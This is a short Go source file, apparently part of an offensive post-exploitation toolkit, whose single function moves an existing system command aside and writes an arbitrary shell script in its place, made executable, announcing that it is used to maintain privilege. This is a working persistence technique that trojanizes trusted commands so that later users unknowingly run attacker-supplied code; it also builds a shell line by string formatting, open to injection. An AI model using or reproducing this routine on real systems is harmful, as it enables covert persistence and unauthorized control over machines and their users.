package maintance

import (
	"fmt"
	"os"
	"os/exec"
)

func Command_Replace(oldcommand string, dir string, newbash string) {
	fmt.Println("use the command replace to maintance the privilege")
	cmd1 := exec.Command("mv", fmt.Sprintf(oldcommand), fmt.Sprintf(dir))
	err := cmd1.Run()
	if err != nil {
		fmt.Println("Error move the old command", err)
		os.Exit(1)
	}
	cmd2 := exec.Command("sh", "-c", fmt.Sprintf("echo '%s' > %s && chmod +x %s", newbash, oldcommand, oldcommand))
	err = cmd2.Run()
	if err != nil {
		fmt.Println("Error change the old command to the new bash command", err)
		os.Exit(1)
	}
	fmt.Println("success")
}
